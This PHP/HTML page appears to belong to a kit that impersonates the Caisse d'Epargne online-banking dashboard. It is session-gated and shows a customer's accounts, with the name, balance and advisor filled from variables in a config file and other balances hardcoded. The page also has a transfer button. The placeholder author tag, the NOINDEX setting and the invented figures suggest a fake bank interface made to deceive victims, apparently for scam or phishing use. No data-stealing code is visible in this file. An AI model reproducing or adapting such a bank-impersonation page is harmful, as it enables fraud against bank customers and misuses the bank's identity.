<?php
include('inc/confu1.php');
if (session_id() == "")
{
   session_start();
}
if (!isset($_SESSION['username']))
{
   header('Location: ./../access_deny.php');
   exit;
}
if (isset($_SESSION['expires_by']))
{
   $expires_by = intval($_SESSION['expires_by']);
   if (time() < $expires_by)
   {
      $_SESSION['expires_by'] = time() + intval($_SESSION['expires_timeout']);
   }
   else
   {
      unset($_SESSION['username']);
      unset($_SESSION['expires_by']);
      unset($_SESSION['expires_timeout']);
      header('Location: ./../access_deny.php');
      exit;
   }
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Banque et assurance</title>
<meta name="author" content="Pirvate Untherthered">
<meta name="robots" content="NOINDEX, NOFOLLOW">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="ulgn=1.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="jquery-1.11.1.min.js"></script>
<script type="text/javascript" src="fancybox/jquery.easing-1.3.pack.js"></script>
<link rel="stylesheet" href="fancybox/jquery.fancybox-1.3.0.css" type="text/css">
<script type="text/javascript" src="fancybox/jquery.fancybox-1.3.0.pack.js"></script>
<script type="text/javascript" src="fancybox/jquery.mousewheel-3.0.2.pack.js"></script>
<script type="text/javascript" src="wwb10.min.js"></script>
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Shape2" style="position:absolute;left:6px;top:15px;width:982px;height:566px;z-index:0;">
<img src="images/img0004.png" id="Shape2" alt="" style="width:982px;height:566px;"></div>
<div id="wb_Image1" style="position:absolute;left:8px;top:25px;width:260px;height:60px;z-index:1;">
<img src="images/national_logo.png" id="Image1" alt=""></div>
<div id="wb_CssMenu1" style="position:absolute;left:7px;top:85px;width:1020px;height:74px;z-index:2;">
<ul>
<li class="firstmain"><a href="ulgn=1.php" target="_self">Ma&nbsp;synth&#232;se</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;comptes</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;cr&#233;dits</a>
</li>
<li><a href="#" target="_self">Mon&nbsp;&#233;pargne</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;assurances</a>
</li>
</ul>
<br>
</div>
<div id="wb_Image2" style="position:absolute;left:846px;top:23px;width:17px;height:17px;z-index:3;">
<img src="images/locked-1.png" id="Image2" alt=""></div>
<div id="wb_Shape1" style="position:absolute;left:6px;top:588px;width:982px;height:203px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:4;">
<img src="images/img0005.png" id="Shape1" alt="" style="width:982px;height:203px;"></div>
<div id="wb_Image3" style="position:absolute;left:13px;top:603px;width:232px;height:164px;z-index:5;">
<img src="images/allocation-pilotee-equilibre_push_marketing.gif" id="Image3" alt=""></div>
<div id="wb_Image4" style="position:absolute;left:255px;top:603px;width:232px;height:164px;z-index:6;">
<img src="images/livrets-a-connecter_push_marketing.gif" id="Image4" alt=""></div>
<div id="wb_Image5" style="position:absolute;left:498px;top:603px;width:232px;height:164px;z-index:7;">
<img src="images/diversifiez-vos-placements-dans-l-immobilier_push_marketing.gif" id="Image5" alt=""></div>
<div id="wb_Image6" style="position:absolute;left:745px;top:603px;width:232px;height:164px;z-index:8;">
<img src="images/preuve-coloc_push_marketing.gif" id="Image6" alt=""></div>
<div id="wb_Image7" style="position:absolute;left:23px;top:826px;width:257px;height:269px;z-index:9;">
<img src="images/search-france-big.png" id="Image7" alt=""></div>
<div id="wb_Text1" style="position:absolute;left:374px;top:912px;width:591px;height:23px;z-index:10;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:20px;">Rendez-vous sur le site de la Caisse d'Epargne de votre région</span></div>
<div id="wb_Text2" style="position:absolute;left:375px;top:946px;width:552px;height:48px;z-index:11;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Afin de proposer des solutions adaptées aux besoins de chacun, la Caisse d'Epargne s'appuie sur les conseils personnalisés de son réseau d'experts, répartis dans ses 17 Caisses régionales.</span></div>
<div id="wb_Shape3" style="position:absolute;left:7px;top:1105px;width:970px;height:3px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:12;">
<img src="images/img0006.png" id="Shape3" alt="" style="width:970px;height:3px;"></div>
<div id="wb_Text3" style="position:absolute;left:7px;top:1119px;width:248px;height:192px;z-index:13;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>BANQUE AU QUOTIDIEN</strong></span><span style="color:#696969;font-family:Arial;font-size:13px;"><strong><br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Ouvrir un compte bancaire<br>Gérer ses comptes<br>Carte Bancaire<br>Carte Bancaire Rechargeable<br>Transmission - Successions<br>Comprendre les frais bancaires<br>Garantie des dépôts<br>Comptes inactifs et déshérence<br>Echange d’informations fiscales<br>Tarifs et informations réglementaires</strong></span></div>
<div id="wb_Text4" style="position:absolute;left:280px;top:1119px;width:250px;height:144px;z-index:14;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>AIDE ET OUTILS PRATIQUES<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Contacts - numéros utiles<br>Assistance perte et vol / Opposition<br>Focus - «&nbsp;Tout savoir sur…&nbsp;»<br>Guides Pratiques<br>FAQ<br>Mentions légales<br>Sécurité</strong></span></div>
<div id="wb_Text5" style="position:absolute;left:530px;top:1119px;width:250px;height:176px;z-index:15;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>PROFESSIONNELS<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Outils et services pros<br>Compte professionnel<br>Prévenir le risque de fraude<br>Entreprises<br>Associations / Economie sociale<br>Secteur Public<br>Logement Social<br>Immobilier Professionnel<br>E-remises</strong></span></div>
<div id="wb_Text6" style="position:absolute;left:762px;top:1119px;width:250px;height:160px;z-index:16;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>LA CAISSE D’EPARGNE ET VOUS<br></strong><br></span><span style="color:#696969;font-family:Arial;font-size:13px;">Nous connaitre<br>Fédération Nationale (FNCE)<br>Sponsoring - Mécénat<br>Recrutement<br>Site Sociétaires<br>Décideurs en Région<br>Horizon Entrepreneurs<br>Changer de Caisse</span></div>
<div id="wb_Image8" style="position:absolute;left:789px;top:1063px;width:32px;height:32px;z-index:17;">
<a href="#"><img src="images/facebook.png" id="Image8" alt=""></a></div>
<div id="wb_Image9" style="position:absolute;left:831px;top:1063px;width:32px;height:32px;z-index:18;">
<a href="#"><img src="images/twitter.png" id="Image9" alt=""></a></div>
<div id="wb_Image10" style="position:absolute;left:874px;top:1063px;width:32px;height:32px;z-index:19;">
<a href="#"><img src="images/instagram.png" id="Image10" alt=""></a></div>
<div id="wb_Shape4" style="position:absolute;left:9px;top:154px;width:612px;height:34px;z-index:20;">
<a href=""><img class="hover" src="images/img0008_hover.png" alt="" style="border-width:0;width:612px;height:34px;"><span><img src="images/img0008.png" id="Shape4" alt="" style="width:612px;height:34px;"></span></a></div>
<div id="wb_Text7" style="position:absolute;left:12px;top:139px;width:256px;height:16px;z-index:21;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:13px;"><strong>Ma synthèse</strong></span></div>
<div id="wb_Shape6" style="position:absolute;left:631px;top:267px;width:357px;height:34px;z-index:22;">
<a href=""><img class="hover" src="images/img0014_hover.png" alt="" style="border-width:0;width:357px;height:34px;"><span><img src="images/img0014.png" id="Shape6" alt="" style="width:357px;height:34px;"></span></a></div>
<div id="wb_Text9" style="position:absolute;left:643px;top:308px;width:307px;height:96px;z-index:23;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Cliquez ici pour accéder à vos souscriptions initiées par téléphone ou sur Internet en cours de finalisation. Suivez également l’avancement de votre crédit immobilier.<br><br>Voir mes demandes en cours</span></div>
<div id="wb_Text10" style="position:absolute;left:644px;top:475px;width:263px;height:54px;z-index:24;text-align:left;">
<div><span style="color:#000000;font-family:Arial;font-size:13px;">Mon conseiller&nbsp;: </span></div>
<div style="line-height:19px;"><span style="color:#000000;font-family:Arial;font-size:13px;"><strong>
<?php
echo $conseiller;
?>
</strong></span></div>

<div style="line-height:19px;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; </strong><?php echo $numconseiller_u1; ?></span></div>
</div>
<div id="wb_Text8" style="position:absolute;left:15px;top:201px;width:670px;height:16px;z-index:25;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>CPT DEPOT PART</strong>.&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 043881XXXXX	&nbsp;&nbsp;&nbsp; 
<?php echo $nom;?>&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; <strong><?php echo $solde;?></strong></span></div>
<div id="wb_Shape8" style="position:absolute;left:629px;top:154px;width:359px;height:427px;z-index:26;">
<img src="images/img0016.png" id="Shape8" alt="" style="width:359px;height:427px;"></div>
<div id="wb_Shape5" style="position:absolute;left:631px;top:154px;width:357px;height:34px;z-index:27;">
<a href=""><img class="hover" src="images/img0013_hover.png" alt="" style="border-width:0;width:357px;height:34px;"><span><img src="images/img0013.png" id="Shape5" alt="" style="width:357px;height:34px;"></span></a></div>
<div id="wb_Shape7" style="position:absolute;left:631px;top:428px;width:357px;height:34px;z-index:28;">
<a href=""><img class="hover" src="images/img0015_hover.png" alt="" style="border-width:0;width:357px;height:34px;"><span><img src="images/img0015.png" id="Shape7" alt="" style="width:357px;height:34px;"></span></a></div>
<div id="wb_Image11" style="position:absolute;left:644px;top:505px;width:24px;height:24px;z-index:29;">
<img src="images/telephone-receiver-with-circular-arrows.png" id="Image11" alt=""></div>
<input type="button" id="Button1" onclick="window.location.href='show=vir.php'; ;return false;" name="" value="Effectuer un virement" style="position:absolute;left:13px;top:272px;width:137px;height:25px;z-index:30;">
<div id="wb_Text11" style="position:absolute;left:15px;top:230px;width:591px;height:16px;z-index:31;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>Encours CB&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; - 160,41 €</strong></span></div>
<div id="wb_Shape10" style="position:absolute;left:6px;top:224px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:32;">
<a href=""><img class="hover" src="images/img0018_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0018.gif" id="Shape10" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Shape9" style="position:absolute;left:9px;top:195px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:33;">
<a href=""><img class="hover" src="images/img0017_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0017.gif" id="Shape9" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Shape11" style="position:absolute;left:13px;top:305px;width:612px;height:34px;z-index:34;">
<a href=""><img class="hover" src="images/img0019_hover.png" alt="" style="border-width:0;width:612px;height:34px;"><span><img src="images/img0019.png" id="Shape11" alt="" style="width:612px;height:34px;"></span></a></div>
<div id="wb_Text12" style="position:absolute;left:14px;top:343px;width:254px;height:16px;z-index:35;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Mon épargne disponible</span></div>
<div id="wb_Text13" style="position:absolute;left:14px;top:373px;width:592px;height:32px;z-index:36;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>LIVRET A 013751XXXXX	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; </strong><?php echo $nom;?>	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; + 298,38 €</span></div>
<div id="wb_Shape12" style="position:absolute;left:6px;top:360px;width:609px;height:45px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:37;">
<a href=""><img class="hover" src="images/img0020_hover.gif" alt="" style="border-width:0;width:609px;height:45px;"><span><img src="images/img0020.gif" id="Shape12" alt="" style="width:609px;height:45px;"></span></a></div>
<div id="wb_Text14" style="position:absolute;left:14px;top:400px;width:244px;height:16px;z-index:38;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Mes plans et contrats d'épargne</span></div>
<div id="wb_Text15" style="position:absolute;left:15px;top:428px;width:600px;height:18px;z-index:39;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>PEL&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; A 013751XXXXX	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; </strong><?php echo $nom;?>	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; + 298,38 €<br></span></div>
<div id="wb_Shape13" style="position:absolute;left:13px;top:413px;width:609px;height:45px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:40;">
<a href=""><img class="hover" src="images/img0021_hover.gif" alt="" style="border-width:0;width:609px;height:45px;"><span><img src="images/img0021.gif" id="Shape13" alt="" style="width:609px;height:45px;"></span></a></div>
<div id="wb_Text16" style="position:absolute;left:15px;top:472px;width:253px;height:16px;z-index:41;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Mes titres</span></div>
<div id="wb_Text17" style="position:absolute;left:13px;top:502px;width:593px;height:32px;z-index:42;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">COMPTE TITRES	300613XXXXX	&nbsp;&nbsp; <?php echo $nom;?>	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; + 1 504,64 €</span></div>
<div id="wb_Text18" style="position:absolute;left:643px;top:207px;width:250px;height:16px;z-index:43;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">
<?php echo $info_u1;?>
</span></div>
<div id="wb_Image12" style="position:absolute;left:638px;top:159px;width:22px;height:22px;filter:alpha(opacity=70);-moz-opacity:0.70;opacity:0.70;z-index:44;">
<img src="images/info.png" id="Image12" alt=""></div>
<div id="wb_Text19" style="position:absolute;left:280px;top:49px;width:250px;height:17px;z-index:45;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:15px;">Particuliers&nbsp; </span><span style="color:#000000;font-family:Arial;font-size:15px;">| Professionnels</span></div>
<div id="wb_Shape14" style="position:absolute;left:268px;top:47px;width:92px;height:22px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:46;">
<a href=""><img class="hover" src="images/img0022_hover.gif" alt="" style="border-width:0;width:92px;height:22px;"><span><img src="images/img0022.gif" id="Shape14" alt="" style="width:92px;height:22px;"></span></a></div>
<div id="wb_Text20" style="position:absolute;left:874px;top:24px;width:252px;height:16px;z-index:47;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Déconnexion</span></div>
<div id="wb_Shape15" style="position:absolute;left:836px;top:19px;width:152px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:48;">
<a href="./../index.html" title="Deconnexion"><img class="hover" src="images/img0033_hover.gif" alt="" style="border-width:0;width:152px;height:28px;"><span><img src="images/img0033.gif" id="Shape15" alt="" style="width:152px;height:28px;"></span></a></div>
</div>
</body>
</html>